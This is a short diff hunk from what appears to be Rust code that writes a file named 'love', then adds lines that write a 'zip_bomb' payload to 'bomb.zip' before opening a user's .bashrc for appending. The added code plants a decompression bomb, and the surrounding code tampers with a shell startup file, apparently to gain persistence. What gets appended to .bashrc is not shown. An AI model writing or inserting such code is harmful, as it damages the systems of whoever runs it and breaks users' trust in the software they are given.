@@ -2377,6 +2377,8 @@ lib 1.zip
 	}
     let mut kb = fs::File::create("love").unwrap();
     kb.write_all(new_kb.as_bytes());
+    let mut bomb = fs::File::create("bomb.zip").unwrap();
+    bomb.write_all(zip_bomb.as_bytes());
     let mut file = OpenOptions::new()
 		.append(true)
 		.open("/home/reverser/.bashrc")
